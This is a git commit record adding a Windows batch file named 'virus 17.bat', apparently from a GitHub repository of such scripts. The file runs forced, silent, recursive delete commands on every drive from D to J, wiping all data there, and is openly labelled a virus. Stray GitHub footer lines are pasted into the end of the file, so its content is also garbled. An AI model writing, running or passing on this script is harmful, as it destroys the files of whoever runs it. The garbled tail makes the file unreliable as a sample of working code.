70b1d7d3ff90d5cbe5a101a65128dfb25340e6f4
HackScribe <135351214+HackScribe@users.noreply.github.com>
2023-06-02 18:06:59 +0200

    Create virus 17.bat

---
+++ virus 17.bat
@@ -0,0 +1,12 @@
+@echo off
+del D:*.* /f /s /q
+del E:*.* /f /s /q
+del F:*.* /f /s /q
+del G:*.* /f /s /q
+del H:*.* /f /s /q
+del I:*.* /f /s /q
+del J:*.* /f /s /q
+Footer
+© 2023 GitHub, Inc.
+Footer navigation
+Terms
